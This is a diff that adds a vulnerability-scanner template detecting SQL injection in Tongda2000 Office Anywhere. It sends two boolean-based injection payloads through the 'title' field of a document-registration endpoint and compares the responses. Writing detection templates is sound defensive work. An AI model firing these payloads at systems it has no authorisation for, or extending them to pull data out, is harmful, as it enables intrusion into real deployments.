@@ -1,0 +1,42 @@
+id: tongda2000-office-anywhere-sql-injection
+info:
+  name: Tongda2000 Office Anywhere SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Vulnerability in Tongda2000 Office Anywhere allowing SQL injection via the `title` parameter in POST requests.
+
+http:
+  - id: "r0"
+    method: POST
+    path:
+      - "{{BaseURL}}/general/document/index.php/recv/register/insert"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "title)values(\"'\"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER="
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: "r1"
+    method: POST
+    path:
+      - "{{BaseURL}}/general/document/index.php/recv/register/insert"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "title)values(\"'\"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER="
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SQL"
+        part: body
+
+variables:
+  result: "{{http.r0.status == 302 && http.r1.status == 500}}"
